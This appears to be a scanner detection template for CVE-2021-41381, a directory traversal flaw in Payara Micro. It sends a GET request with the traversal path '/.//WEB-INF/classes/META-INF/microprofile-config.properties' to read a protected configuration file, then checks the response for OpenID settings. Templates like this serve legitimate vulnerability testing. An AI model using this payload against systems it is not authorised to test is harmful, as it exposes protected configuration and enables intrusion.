id: CVE-2021-41381

info:
  name: Payara Micro Community 5.2021.6 Directory Traversal
  author: pikpikcu
  severity: high
  description: |-
    Payara Micro Community 5.2021.6 and below contains a directory traversal vulnerability. app="Payara-Micro"
  reference:
    - https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2021-054.txt
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41381
    - https://www.payara.fish
  tags: cve,cve2021,traversal,payara
  created: 2023/06/16

rules:
  r0:
    request:
      method: GET
      path: /.//WEB-INF/classes/META-INF/microprofile-config.properties
    expression: response.status == 200 && response.body.bcontains(b'payara.security.openid.default.providerURI=') && response.body.bcontains(b'payara.security.openid.sessionScopedConfiguration=true')
expression: r0()
